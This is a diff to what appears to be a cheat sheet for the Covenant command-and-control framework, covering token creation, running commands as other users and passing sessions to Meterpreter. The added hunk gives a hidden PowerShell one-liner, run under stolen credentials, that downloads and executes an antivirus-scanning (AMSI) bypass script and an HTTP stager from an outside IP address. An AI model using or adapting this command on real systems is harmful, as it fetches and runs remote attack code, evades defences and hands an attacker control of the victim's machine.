@@ -104,6 +104,12 @@ MakeToken /username:"<USER>" /domain:"<DOMAIN>" /password:"<PASSWORD>" /logontyp
 ShellRunAs /shellcommand:"whoami" /username:"<USERNAME>" /domain:"<DOMAIN>" /password:"<PASSWORD>"
 ```
 
+
+#### Runas new shell example
+```
+ShellRunAs /shellcommand:"powershell -Sta -Nop -Window Hidden -Command \"iex (New-Object Net.WebClient).DownloadString('http://10.10.15.16:8080/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://10.10.15.16/HTTPStager.ps1')\"" /username:"<USERNAME>" /domain:"<DOMAIN>" /password:"<PASSWORD>"
+```
+
 ### Session passing
 #### Covenant --> Meterpreter
 ```
